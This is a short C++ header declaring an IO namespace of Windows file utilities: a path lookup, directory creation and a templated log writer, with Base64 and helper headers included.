//
// Created by younes.benhoumich on 11/02/2018.
//

#pragma once

#include <string>
#include <cstdlib>
#include <fstream>

#include <windows.h>
#include "Helper.hpp"
#include "Base64.hpp"

namespace IO {
    std::string GetOurPath(const bool append_separator = false);
    bool MkOneDir(std::string path);
    bool MkDir(std::string path);
    template <class T> std::string WriteLog(const T &t);

}

